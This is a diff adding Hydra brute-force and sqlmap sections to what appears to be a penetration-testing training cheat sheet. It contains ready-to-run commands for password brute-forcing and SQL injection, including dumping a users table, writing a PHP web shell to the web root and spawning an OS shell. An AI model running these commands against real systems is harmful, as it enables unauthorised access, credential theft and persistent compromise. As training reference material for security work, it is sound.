@@ -629,3 +629,57 @@ Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
 # PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.
 Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
 ```
+
+## Login Brute Forcing
+
+##### Hydra
+```
+# Basic Auth Brute Force - User/Pass Wordlists
+hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /
+
+# Login Form Brute Force - Static User, Pass Wordlist
+hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+```
+
+## SQLMap
+```
+# Run SQLMap without asking for user input
+sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
+
+# SQLMap with POST request specifying an unjection point with asterisk
+sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
+
+# Passing an HTTP request file to SQLMap
+sqlmap -r req.txt
+
+# Specifying a PUT request
+sqlmap -u www.target.com --data='id=1' --method PUT
+
+# Specifying a prefix or suffix
+sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
+
+# Basic DB enumeration
+sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+
+# Table enumeration
+sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+
+# Table row enumeration
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+
+# Conditional enumeration
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
+
+# CSRF token bypass
+sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+
+# List all tamper scripts
+sqlmap --list-tampers
+
+# Writing a file
+sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+
+# Spawn a shell
+sqlmap -u "http://www.example.com/?id=1" --os-shell
+```
+
